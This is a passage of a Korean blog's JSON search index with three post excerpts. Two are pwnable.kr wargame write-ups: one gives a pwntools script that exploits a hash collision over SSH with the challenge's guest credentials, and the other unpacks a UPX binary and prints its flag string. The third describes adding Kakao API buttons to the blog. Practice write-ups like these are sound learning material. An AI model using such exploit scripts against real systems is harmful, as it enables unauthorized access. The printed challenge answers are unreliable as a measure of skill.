준다. 반환받은 res 의 값은 0x21DD09EC 이 되어야 하고 이 값은 4바이트씩 읽어들인 값을 5번 더했을 때의 값이니 0x21DD09EC를 5로 나누어서 5번 더하면 된다. 정확히 나누어떨어지는 게 아니므로 4번 더한후 마지막에 나머지를 더한값을 더해주면 된다. col_payload.py from pwn import *import structLE = lambda x : struct.pack(&quot;&lt;L&quot; , x)s = ssh(host=&#39;pwnable.kr&#39;,user=&#39;col&#39;,password=&#39;guest&#39;,port=2222)hashcode = 0x21dd09ecdata1 = LE(hashcode/5)data2 = LE(hashcode/5+hashcode%5)r = s.run(&quot;&quot;&quot;./col `python -c &#39;print &quot;{}&quot;*4+&quot;{}&quot;&#39;` &quot;&quot;&quot;.format(data1,data2))print r.recvall()s.close()","categories": ["Wargame"],
        "tags": ["system","Pwnable.kr"],
        "url": "https://imreplay.com/wargame/pwnablekr-col/",
        "teaser":null},{
        "title": "[Pwnable.kr] Toddler's Bottle - flag 풀이",
        "excerpt":"문제 Papa brought me a packed present! let's open it.Download : http://pwnable.kr/bin/flagThis is reversing task. all you need is binary문제 파일은 http://pwnable.kr/bin/flag 에서 다운로드 받을 수 있다. 어떤 파일인지 간단하게 확인해 보자. $ file flagflag: ELF 64-bit LSB  executable, x86-64, version 1 (GNU/Linux), statically linked, strippedELF파일 포맷을 가지고 있는 실행파일인 것 같다. 문제에서 packed 선물을 사주었다고 하는 것을 보니 패킹된 파일 인 듯 하다. 일단 gdb에서 확인해 보려했지만, 분석을 하지 못한다. strings 명령어를 통해 내부 문자열을 확인해보았다. ~~ 중략 ~~$Info: This file is packed with the UPX executable packer http://upx.sf.net $$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $~~ 중략 ~~UPX 패킹이 되어있는 것 같다. upx 도구를 다운 받아서 decompress를 해주었다. ./upx -d ../flag -o ../d_flag                       Ultimate Packer for eXecutables                          Copyright (C) 1996 - 2017UPX 3.94        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   May 12th 2017        File size         Ratio      Format      Name   --------------------   ------   -----------   -----------    883745 &lt;-    335288   37.94%   linux/amd64   d_flagUnpacked 1 file.이제 gdb를 통해 다시 확인 해보자. # gdb d_flag -qReading symbols from d_flag...(no debugging symbols found)...done.gdb-peda$ pdisas mainDump of assembler code for function main:   0x0000000000401164 &lt;+0&gt;:     push   rbp   0x0000000000401165 &lt;+1&gt;:     mov    rbp,rsp   0x0000000000401168 &lt;+4&gt;:     sub    rsp,0x10   0x000000000040116c &lt;+8&gt;:     mov    edi,0x496658   0x0000000000401171 &lt;+13&gt;:    call   0x402080 &lt;puts&gt;   0x0000000000401176 &lt;+18&gt;:    mov    edi,0x64   0x000000000040117b &lt;+23&gt;:    call   0x4099d0 &lt;malloc&gt;   0x0000000000401180 &lt;+28&gt;:    mov    QWORD PTR [rbp-0x8],rax   0x0000000000401184 &lt;+32&gt;:    mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 &lt;flag&gt;   0x000000000040118b &lt;+39&gt;:    mov    rax,QWORD PTR [rbp-0x8]   0x000000000040118f &lt;+43&gt;:    mov    rsi,rdx   0x0000000000401192 &lt;+46&gt;:    mov    rdi,rax   0x0000000000401195 &lt;+49&gt;:    call   0x400320   0x000000000040119a &lt;+54&gt;:    mov    eax,0x0   0x000000000040119f &lt;+59&gt;:    leave   0x00000000004011a0 &lt;+60&gt;:    retEnd of assembler dump.gdb-peda$ x/s *0x6c20700x496628:       \"UPX...? sounds like a delivery service :)\"gdb-peda$x/s 를 통해 flag라고 적혀있는 부분의 문자열을 읽어왔다. ","categories": ["Wargame"],
        "tags": ["system","Pwnable.kr"],
        "url": "https://imreplay.com/wargame/pwnablekr-flag/",
        "teaser":null},{
        "title": "카카오 API 사용해보기",
        "excerpt":"오래간만의 포스팅, 최근에 찾아보던 카카오 API를 블로그에도 한 번 적용시켜보기로 했다. 적용시킨 항목은 두 가지.   플러스친구 친구추가 버튼  카카오톡으로 공유하기(카카오링크)간단하게 사진으로 확인해보면, 친구추가 버튼    플러스친구 계정 친구추가 버튼 공유하기 버튼(카카오 링크)     포스팅을 카카오톡으로 공유 할 수 있게 해주는 버튼 위와 같이 적용하였다.. 플러스친구는 플러스친구 관리자센터 을 통해서 생성 할 수 있으며,   현재는 kakaoforbusiness라는 이름으로 변경되었다. 카카오 API를 사용하기 위해서는 KakaoDevelopers 에 접속하여 관련 API를 찾아봐야 한다. JacaScript 개발가이드 부분의 시작하기 를 눌러 진행하였는데   앱 만들기  설정에서 플랫폼 추가하기  웹 플랫폼을 선택하고 블로그 도메인 추가하기  API 키 발급 받아 복사해 두기와 같은 과정으로 JavaScript API 키 를 발급받았다. 자세한 내용은 시작하기 - JavaScript 참고 사실 자바스크립트를 사용하는데에 익숙하지 않아 계속 수정에 수정을 반복하다가 어쩌다 보니 구현이 되어서 이러쿵 저러쿵 해서 짜잔! 완성 했습니다! 라는 글은 쓸 수가 없었다… 다만 최종적으로 어느 부분에 어떤식으로 코드를 넣었는지에 대해서만 짤막하게 기록 후 마치도록 하겠다.   좀 더 좋은 방법이 있다면 언제든지 댓글 남겨주세요!! 짱짱 개발자분들 환영합니다!! 공유하기 head.html 의 16번 라인부터 20번 라인까지 &lt;!-- 카카오 API --&gt;&lt;script src=\"https://developers.kakao.com/sdk/js/kakao.min.js\"&gt;&lt;/script&gt; &lt;script type='text/javascript'&gt;  Kakao.init('98ca6e8590c079dd460779d5560a638c');&lt;/script&gt;위의 코드를 추가하였다. 처음에는 사용 할 때 마다 Kakao.init 을 해주어야 하는 줄 알고 사용하는 부분마다 넣어주었는데, 크롬 개발자 도구를 보다 보니 이미 init 되어 있다는 메시지를 보고 처음 한 번만 init하도록 수정하였다. 그 후 social-share.html 의 14번 라인부터 45번 라인까지   &lt;a id=\"kakao-link-btn\" href=\"javascript:;\"&gt;    &lt;img src=\"//developers.kakao.com/assets/img/about/logos/kakaolink/kakaolink_btn_small.png\"/&gt;  &lt;/a&gt;&lt;/section&gt;&lt;script type='text/javascript'&gt;  //&lt;![CDATA[    // // 카카오링크 버튼을 생성합니다. 처음 한번만 호출하면 됩니다.    Kakao.Link.createDefaultButton({      container: '#kakao-link-btn',      objectType: 'feed',      content: {        title: \"카카오 API 사용해보기\",        imageUrl: '',        link: {          mobileWebUrl: 'https%3A%2F%2Fimreplay.com%2Fstudy%2F%25EC%25B9%25B4%25EC%25B9%25B4%25EC%2598%25A4-API-%25EC%2582%25AC%25EC%259A%25A9%25ED%2595%25B4%25EB%25B3%25B4%25EA%25B8%25B0%2F',          webUrl: 'https%3A%2F%2Fimreplay.com%2Fstudy%2F%25EC%25B9%25B4%25EC%25B9%25B4%25EC%2598%25A4-API-%25EC%2582%25AC%25EC%259A%25A9%25ED%2595%25B4%25EB%25B3%25B4%25EA%25B8%25B0%2F'        }      },      buttons: [        {          title: '웹으로 보기',          link: {            mobileWebUrl: 'https%3A%2F%2Fimreplay.com%2Fstudy%2F%25EC%25B9%25B4%25EC%25B9%25B4%25EC%2598%25A4-API-%25EC%2582%25AC%25EC%259A%25A9%25ED%2595%25B4%25EB%25B3%25B4%25EA%25B8%25B0%2F',            webUrl: 'https%3A%2F%2Fimreplay.com%2Fstudy%2F%25EC%25B9%25B4%25EC%25B9%25B4%25EC%2598%25A4-API-%25EC%2582%25AC%25EC%259A%25A9%25ED%2595%25B4%25EB%25B3%25B4%25EA%25B8%25B0%2F'          }        },      ]    });  //]]&gt;&lt;/script&gt;위의 코드를 추가 해 주었다. 공유하기 기능에 글 제목(page.title)과 URL을 동적으로 넣어주기 위해, 다른 페이지에서 불필요하게 실행되지 않도록 하기 위헤 공유하기 부분에 스크립트를 넣게 되었다. 플러스친구 추가 버튼 플러스 친구 버튼은 페이지 모든곳에서 접근이 가능해야 하며 여러개의 계정을 가지고 있으므로 특정 인자값을 매개변수로 넘겨주어 각 프로필을 구분하여 만들 수 있도록 약간 수정하였다. scripts.html의 37번 라인부터 57번 라인까지 &lt;!-- 카카오 플러스친구 추가 버튼 생성 --&gt;&lt;script type='text/javascript'&gt;  //&lt;![CDATA[    //my_id = '_XDeVj';    //info_id = '_RdDHM';    // 플러스친구 친구추가 버튼을 생성합니다.        function addPlusFriend(my_id) {      Kakao.PlusFriend.addFriend({        plusFriendId: my_id // 플러스친구 홈 URL에 명시된 id로 설정합니다.      });    }    function plusFriendChat(my_id) {      Kakao.PlusFriend.chat({        plusFriendId: my_id // 플러스친구 홈 URL에 명시된 id로 설정합니다.      });    }  //]]&gt;  &lt;/script&gt;위의 코드를 추가 하였다. addPlusFriend(my_id)는 친구추가 버튼을 만들어주는 함수이며 plusFriendChat(my_id)는 1:1 대화 버튼을 만들어주는 기능이다. 해당 함수는 author-profile-custom-links.html에서 사용되며   &lt;li&gt;    &lt;a href=\"javascript:void addPlusFriend('_XDeVj')\"&gt;      &lt;img src=\"https://developers.kakao.com/assets/img/about/logos/plusfriend/friendadd_small_black_rect.png\"/&gt;    &lt;/a&gt;  &lt;/li&gt;위와 같이 작성하였다. 지금 포스팅을 작성하면서 보니 그닥 어려워 보이지는 않지만 처음 카카오 API를 사용해 본 이유에서인지 많이 헤메고 버벅거렸던 것 같다. 이상으로 오늘의 포스팅 끝! ","categories": ["Study"],
        "tags": ["kakao"],
        "url": "https://imreplay.com/study/%EC%B9%B4%EC%B9%B4%EC%98%A4-API-%EC%82%AC%EC%9A%A9%ED%95%B4%EB%B3%B4%EA%B8%B0/",
        "teaser":null}]
